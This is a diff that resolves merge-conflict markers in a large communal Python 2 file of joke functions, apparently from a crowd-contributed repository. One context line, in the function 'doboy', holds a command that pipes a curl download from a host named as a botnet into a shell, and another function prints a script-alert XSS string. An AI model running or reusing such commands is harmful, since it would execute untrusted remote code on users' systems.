@@ -440,17 +440,11 @@ def doctorpangloss():
     #matches = re.sub(r'doctorpangloss\(\)\n', r'doctorpangloss()\ndoctorpangloss()\n', raw, re.M|re.I|re.G)
     #print raw
 
-<<<<<<< HEAD
-def ankushsachdeva():
-	contents =open(__file__).read()
-	print re.findall('def .* :',contents)
-=======
 
 def ankushsachdeva():
     contents = open(__file__).read()
     print re.findall('def .* :', contents)
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def adelevie():
     pass
@@ -487,17 +481,6 @@ def bencooling():
     print "I don't know Python; I don't belong here"
     zachlatta()
 
-<<<<<<< HEAD
-def quarterto(m,n):
-    if m == 0:
-        return n+1
-    elif m > 0 and n == 0:
-        return quarterto(m-1,1)
-    elif m > 0 and n > 0:
-        return quarterto(m-1,quarterto(m,n-1))
-    else:
-        return 0
-=======
 
 def quarterto(m, n):
     pass
@@ -520,7 +503,6 @@ def zgohr(city):
     print 'and it is too damn cold' \
         if fahrenheit < 50 else 'and the temperature outside is tolerable'
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def kisom():
     geoip = json.loads(requests.get('http://freegeoip.net/json/').content)
@@ -541,10 +523,7 @@ def ncammarata():
     tweets = requests.get("https://search.twitter.com/search.json?q=a").json
     tweet = tweets['results'][0]['text']
     print "Random Tweet:", tweet.encode('utf-8')
-<<<<<<< HEAD
-=======
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 # Generate a random nonsense word with a vowel:consolant ratio of 1:5
 def taylorlapeyre():
@@ -564,12 +543,8 @@ def thenonameguy():
     print "Go is awesome!"
 
 def kghose():
-<<<<<<< HEAD
-    import curses, time
-=======
     import curses
     import time
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
     def main_loop(window):
         window.clear()
@@ -592,10 +567,6 @@ def kghose():
                     keep_finding = True
                     break
 
-<<<<<<< HEAD
-
-=======
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
     def paint_grid(window, numbers):
         for row in xrange(10):
             for col in xrange(10):
@@ -610,10 +581,7 @@ def kghose():
 
     curses.wrapper(main_loop)
 
-<<<<<<< HEAD
-=======
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 def jessex():
     os.execl("/bin/echo", "echo", "This is a long way to go for "
              "'hello world' but life's about the journey.")
@@ -842,8 +810,7 @@ def henghonglee():
 def jhgaylor():
     print "Signing in from Starkville, Mississippi."
 
-<<<<<<< HEAD
-def klebsh():
+def hklebs():
     print "000000000000000000000000000000"
     print "0000    0000    000000    0000"
     print "0000    0000    000000    0000"
@@ -853,8 +820,6 @@ def klebsh():
     print "0000    0000    000000    0000"
     print "0000    0000    000000    0000"
     print "000000000000000000000000000000"
-=======
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def mmay():
     url = "http://placekitten.com/%d/%d" % \
@@ -1072,11 +1037,6 @@ def chris911():
 def PiersonBro():
     print "My bane was not capability it was randomness."
 
-<<<<<<< HEAD
-def dogukantufekci():
-    print "This is the connected world."
-    webbrowser.open('http://www.silverspore.com/wiki/images/1/12/Connected_world-medium.jpg')
-=======
 
 def dogukantufekci():
     print "This is the connected world."
@@ -1151,7 +1111,6 @@ def umurgdk():
         print fork["owner"]["login"], \
             ("<= That's me ^_^" if fork["owner"]["login"] == 'umurgdk' else "")
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def doboy(doboy_):
     if doboy == doboy_:
@@ -1159,12 +1118,9 @@ def doboy(doboy_):
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
-<<<<<<< HEAD
-=======
-        
+
 def BRBRBRBR():
     print 'Hi from BRAZIL! REMEMBER BRBRBRBRBRBR HUEHUEHUE!'
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def ngokevin(shamelessadvertising):
     # I'm sleepy zzz.
@@ -1173,15 +1129,12 @@ def ngokevin(shamelessadvertising):
     print '<script>alert("HAHAHA");</script>'
     import antigravity
 
-<<<<<<< HEAD
-=======
 
 def rodaaj():
     name = "karl"
     print name + " The Bro"
 
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 def gardaud(func):
         print "Should I execute func?"
         if random.randrange(0, 2) == 0:
@@ -1278,10 +1231,7 @@ def rightfold():
 def shazeline(name):
     print name + " is a pretty cool guy"
 
-<<<<<<< HEAD
-=======
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 def samlabs821():
     print "vesselam"
 
@@ -1326,52 +1276,13 @@ def dmercer(number, start=2):
             sieve.append(n)
     return sieve
 
-<<<<<<< HEAD
-=======
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 def ryanseys():
     try:
         ryanseys()
     except:
         pass
 
-<<<<<<< HEAD
-def danielnr(huehue):
-    print "                                                                                "
-    print "                                                                                "
-    print "                             SIGNING IN FROM ALASKA                             "
-    print "                                                                                "
-    print "                                                                                "
-    print "                                                                                "
-    print "                                           ``-:/:::.                            "
-    print "                          `.::::::-.``-:////:-.```.://:::--`                    "
-    print "                      .:///-.````.-://///:.          `....-://:.                "
-    print "                   -//-..-:::--`    .hNNNs:+                 ``:/-              "
-    print "                 -/-`  //-....-+:   oMMMMm`o: ``                `-+.            "
-    print "                //`   `y      `o-   -ydmdo:s+//////:.       `://+/-+:           "
-    print "             `-/:      o:   .:/.     ``.../o.     `.:/.    -+./mNNm+o:          "
-    print "        ```-//-`       `+///-`           -s```       `//   :+`yMMMMd`/:.        "
-    print "     `////:-`            ``              y/./.    .`   o:   .:ohmdy/  .:/:-     "
-    print "     .s        `.                       `h-.`     ::.` +/      ...`      `-/-   "
-    print "      ://:::::/::/-                      //.       `.:oo`                   -/- "
-    print "        `....`   `////:-         `.`      `:/::---:://-`                 ..`  -+"
-    print "                    ```s-        +/+-    `.```.....``                   o/://. +"
-    print "                      /+         -s.+-.-//::///--..``                   .o. `s.+"
-    print "                     `y`          :/-://-```  `.--::/:                   .+-.o-+"
-    print "                     .y            `-:::::////--.````:/.`````              --. +"
-    print "                     +o                      `.-::://:-/+++++                  +"
-    print "                    `d++                             .:://::`                  +"
-    print "                    :d +:                                                      +"
-    print "                    os  //`                                                    +"
-    print "                  `+++/- `:/.       DANIELNR                            .//:::-o"
-    print "                 `o-   -/:``:/-`                                      `:h. `...:"
-    print "                 o:      .//.`HTTPS://DANIELNR.COM/                 `//.h+      "
-    print "                +/         `-///--////-.                         `.//. `d:      "
-    print "               :o              `-/////+sy-                   -////-`   oy       "
-    print "               y.                   `````                   /so+//:::/+d-       "
-    print "              /s------------------------------------------------::///:/         "
-=======
 
 def nathanathan(function, yays=[], nays=[]):
     """
@@ -1477,7 +1388,6 @@ def danielnr():
     print "              /s------------------------------------------------:" \
           ":///:/         "
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def spratt():
     print "Simon was here"
@@ -1621,8 +1531,6 @@ def zonetti():
     print "Open Source FTW"
 
 
-<<<<<<< HEAD
-=======
 def hako():
         from datetime import date
 
@@ -1638,7 +1546,6 @@ def hako():
         print yllo.NRML
         print url
 
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
 
 def pocon():
     import __hello__
@@ -1742,11 +1649,6 @@ def awesoham(n):
         return (x + 1) ** (x + 1) / x ** x - x ** x / (x - 1) ** (x - 1)
 
 
-<<<<<<< HEAD
-
-if __name__ == "__main__":
-    klebsh()
-=======
 def ncerminara(n):
     phi = (1 + 5 ** 0.5) / 2
     return int(round((phi ** n - (1 - phi) ** n) / 5 ** 0.5))
@@ -1776,7 +1678,7 @@ def dlutcat():
 def rypeck():
     import this
     print this.s
-    
+  
                              
 def yeco():
     import this
@@ -1890,7 +1792,6 @@ if __name__ == "__main__":
     prashantc29()
     abhirajbutala()
     newsocialifecom();
-    dethos()
     phooky()
     antonaut()  # DOUBLE-RAINBOW! Soo cool
     nerdingoff()
@@ -1901,7 +1802,6 @@ if __name__ == "__main__":
     erictherobot()
     sikado()
     dlad()
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
     starefossen()
     lbalceda(42)
     heinzf(False)  # this thing makes it hard to make sure stuff works,
@@ -1991,16 +1891,12 @@ if __name__ == "__main__":
     jessex()
     rightfold()
     lax()
-<<<<<<< HEAD
-    danielnr("huehue")
-=======
     nathanathan(lambda: shazeline("sricola"), yays=["nathanathan"])
     hako()
     thisishugo()
     lcynot()
     danielnr()
     ncerminara(3)
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
     spratt()
     mufid()
     aturcino()
@@ -2010,10 +1906,6 @@ if __name__ == "__main__":
     alisnic(random.randint(1, 1024))
     zonetti()
     pocon()
-<<<<<<< HEAD
-
-
-=======
     caffeinewriter()
     spectralshadow514()
     bheesham()
@@ -2046,6 +1938,5 @@ if __name__ == "__main__":
     # bottom of someone else's function then your
     # commit should automerge. Please consider this
     # ---------------------------------------------
->>>>>>> 6904895dbb4ff551f46c62bdf8b17acd850cb9ec
     # as per instructed, please leave this as the final function
     lafin()
